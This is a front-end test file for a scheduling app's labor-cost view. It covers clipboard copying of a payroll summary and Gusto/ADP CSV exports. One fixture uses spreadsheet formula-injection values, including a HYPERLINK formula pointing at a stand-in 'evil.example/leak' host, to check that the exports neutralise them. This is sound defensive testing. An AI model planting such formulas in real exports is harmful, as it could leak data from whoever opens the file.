/**
 * "Share with owner": a manager can copy the labor-cost numbers already shown
 * on screen as plain text, to hand to the business owner. Pure client-side —
 * it only reformats data already on `solution`, nothing is fetched or saved.
 */
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, screen, cleanup, fireEvent, waitFor } from '@testing-library/react';
import { LaborAnalysisView } from '../LaborAnalysisView';
import { SolveResponse } from '../../types';

// This repo's vitest config has no globals, so Testing Library does not unmount
// between tests on its own.
afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

const baseSolution = (): SolveResponse => ({
  instance_name: 'Maple Street Convenience',
  archetype_id: 'convenience_store',
  instance_size_category: 'Small',
  constrainedness_category: 'Medium',
  total_weekly_staffing_hours: 120,
  feasible_work_sequences_count: 10,
  employee_count: 4,
  active_shift_types_count: 3,
  obj_shift: 0,
  obj_shift_min_bound: 0,
  obj_ergo: 0,
  obj_ergo_sequential_fixed_sd: 0,
  integrated_ergo_gain_pct: 0,
  solve_time_ms: 10,
  eulerian_valid: true,
  eulerian_cycle_summary: '',
  shift_types: [],
  multigraph_nodes: [],
  multigraph_arcs: [],
  roster_lines: [],
  interval_coverage: [],
  ergonomics_audit: {
    total_ergo_objective: 0,
    sequential_baseline_ergo: 0,
    ergo_improvement_pct: 0,
    health_index_score: 0,
    clopening_violations: 0,
    backward_rotation_violations: 0,
    min_rest_hours_observed: 0,
    full_weekends_off_count: 0,
    full_weekends_off_pct: 0,
    consolidated_rest_blocks_pct: 0,
    criteria_breakdown: [],
  },
  pareto_frontier: [],
  labor_analysis: {
    total_scheduled_hours: 120,
    total_regular_hours: 110,
    total_overtime_hours: 10,
    regular_payroll_cost: 1650,
    overtime_payroll_cost: 225,
    total_payroll_cost: 1875,
    avg_hourly_wage: 15,
    hours_per_day: [20, 20, 20, 20, 20, 10, 10],
    cost_per_day: [300, 300, 300, 300, 300, 150, 225],
    overtime_lines_count: 1,
    labor_efficiency_pct: 98,
  },
  employees: [],
});

function stubClipboard() {
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, 'clipboard', {
    value: { writeText },
    configurable: true,
  });
  return writeText;
}

describe('sharing the labor summary with the owner', () => {
  it('copies a plain-text summary with the key payroll numbers already on screen', async () => {
    const writeText = stubClipboard();
    render(<LaborAnalysisView solution={baseSolution()} />);

    fireEvent.click(screen.getByRole('button', { name: 'Copy summary for owner' }));

    await waitFor(() => expect(writeText).toHaveBeenCalledTimes(1));
    const copied = writeText.mock.calls[0][0] as string;

    expect(copied).toContain('Maple Street Convenience');
    expect(copied).toContain('$1,875.00');
    expect(copied).toContain('$1,650.00');
    expect(copied).toContain('$225.00');
    expect(copied).toContain('120h');
    expect(copied).toContain('98%');

    expect(await screen.findByText(/Summary copied/)).toBeTruthy();
  });

  it('tells the manager to try printing instead when the clipboard is unavailable', async () => {
    Object.defineProperty(navigator, 'clipboard', {
      value: {
        writeText: vi.fn().mockRejectedValue(new Error('denied')),
      },
      configurable: true,
    });
    render(<LaborAnalysisView solution={baseSolution()} />);

    fireEvent.click(screen.getByRole('button', { name: 'Copy summary for owner' }));

    expect(await screen.findByText(/Could not copy automatically/)).toBeTruthy();
  });
});

describe('downloading the client-side Gusto/ADP payroll CSV', () => {
  function stubDownload() {
    const createObjectURL = vi.fn().mockReturnValue('blob:mock-url');
    const revokeObjectURL = vi.fn();
    Object.defineProperty(URL, 'createObjectURL', { value: createObjectURL, configurable: true });
    Object.defineProperty(URL, 'revokeObjectURL', { value: revokeObjectURL, configurable: true });
    // jsdom attempts (and fails) to navigate when a real anchor with an href is
    // clicked; the component only uses the click to trigger a download, so that
    // navigation is irrelevant here and we no-op it.
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    return { createObjectURL, revokeObjectURL };
  }

  /** jsdom's Blob can't be read back with Response/.text(), so capture its source parts instead. */
  function captureBlobParts() {
    const parts: string[] = [];
    const OriginalBlob = globalThis.Blob;
    vi.spyOn(globalThis, 'Blob').mockImplementation((blobParts?: BlobPart[], options?: BlobPropertyBag) => {
      parts.push((blobParts || []).join(''));
      return new OriginalBlob(blobParts, options);
    });
    return parts;
  }

  function solutionWithFormulaShapedStaff(): SolveResponse {
    const solution = baseSolution();
    solution.roster_lines = [
      {
        line_number: 1,
        cohort_id: 'C1',
        display_label: 'Line C1',
        assigned_person: '=HYPERLINK("http://evil.example/leak","click")',
        assigned_employee_id: 'emp-1',
        qualification_tier: '+1;@SUM(A1)',
        hourly_wage: 15,
        current_cycle_week: 1,
        next_week_line_number: 1,
        days: [],
        weekly_hours: 40,
        regular_hours: 40,
        overtime_hours: 0,
        estimated_weekly_payroll: 600,
        work_days_count: 5,
        rest_days_count: 2,
        full_weekend_off: true,
        availability_conflicts_count: 0,
        line_ergo_penalty: 0,
      } as SolveResponse['roster_lines'][number],
    ];
    return solution;
  }

  it('neutralizes a formula-shaped employee name/role in the Gusto CSV download', async () => {
    const { createObjectURL } = stubDownload();
    const blobParts = captureBlobParts();
    render(<LaborAnalysisView solution={solutionWithFormulaShapedStaff()} />);

    fireEvent.click(screen.getByRole('button', { name: /Gusto CSV/ }));

    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
    const text = blobParts[0];

    expect(text).toContain("'=HYPERLINK");
    expect(text).toContain("'+1;@SUM(A1)");
    expect(text).not.toMatch(/,=HYPERLINK/);
  });

  it('neutralizes a formula-shaped employee name in the ADP CSV download', async () => {
    const { createObjectURL } = stubDownload();
    const blobParts = captureBlobParts();
    render(<LaborAnalysisView solution={solutionWithFormulaShapedStaff()} />);

    fireEvent.click(screen.getByRole('button', { name: /ADP CSV/ }));

    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
    const text = blobParts[0];

    expect(text).toContain("'=HYPERLINK");
    expect(text).not.toMatch(/,=HYPERLINK/);
  });

  it('properly escapes an embedded quote in the assigned person name instead of breaking the CSV cell', async () => {
    const { createObjectURL } = stubDownload();
    const blobParts = captureBlobParts();
    const solution = solutionWithFormulaShapedStaff();
    solution.roster_lines[0].assigned_person = 'Smith, "Jo"';
    render(<LaborAnalysisView solution={solution} />);

    fireEvent.click(screen.getByRole('button', { name: /Gusto CSV/ }));

    await waitFor(() => expect(createObjectURL).toHaveBeenCalledTimes(1));
    const text = blobParts[0];

    expect(text).toContain('"Smith, ""Jo"""');
  });
});
